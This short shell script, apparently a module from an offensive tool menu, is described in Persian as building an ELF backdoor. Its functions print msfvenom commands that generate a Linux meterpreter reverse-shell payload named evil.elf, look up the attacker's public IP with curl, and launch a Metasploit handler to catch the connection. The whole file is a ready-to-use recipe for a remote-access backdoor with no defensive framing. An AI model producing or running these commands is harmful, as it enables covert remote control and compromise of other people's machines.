DESC="ساخت بکدور ELF"
REQ="msfvenom"
RISK="HIGH"

termux(){ echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o evil.elf"; }

kali(){
cat <<'EOF'
LHOST=$(curl -s ifconfig.me)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o evil.elf
chmod +x evil.elf
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"
EOF
}
